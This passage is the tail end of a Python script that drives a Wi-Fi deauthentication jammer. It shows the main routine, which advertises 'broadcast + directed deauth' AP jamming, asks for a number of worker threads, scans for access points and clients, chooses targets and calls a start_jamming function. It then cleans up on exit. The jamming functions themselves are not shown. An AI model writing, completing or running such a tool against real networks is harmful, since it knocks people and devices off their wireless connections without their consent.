        print(f"  • {c.BRIGHT_MAGENTA}DISPLAY FILTERS{c.RESET} - Press 'f' to cycle filters")
        print(f"  • {c.BRIGHT_CYAN}3 SECOND CHANNEL HOP{c.RESET} - More time for packets")
        print(f"  • {c.BRIGHT_GREEN}FIXED AP JAMMING{c.RESET} - Both broadcast + directed deauth\n")

        try:
            choice = input(f"{c.BRIGHT_CYAN}Worker threads [1-8] or Enter for 3: {c.RESET}").strip()
            if not choice:
                num_workers = 3
            else:
                workers = int(choice)
                num_workers = workers if 1 <= workers <= 8 else 3
        except KeyboardInterrupt:
            print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
            sys.exit(0)

        print(f"\n{c.BRIGHT_GREEN}[✓]{c.RESET} Using {c.BRIGHT_YELLOW}{num_workers}{c.RESET} workers + 1 channel hopper\n")
        countdown(2, "Proceeding")

        aps, clients = scan_networks()

        result = select_whitelist(aps, clients)
        if not result:
            print(f"{c.BRIGHT_RED}[✗]{c.RESET} No targets\n")
            cleanup_processes()
            cleanup_files()
            sys.exit(1)

        target_aps, clients = result

        start_jamming(target_aps, clients)

    except KeyboardInterrupt:
        print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
        cleanup_processes()
        cleanup_files()
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_handler()
    except Exception as e:
        print(f"\n{c.BRIGHT_RED}[✗]{c.RESET} Error: {e}\n")
        cleanup_processes()
        cleanup_files()
        sys.exit(1)
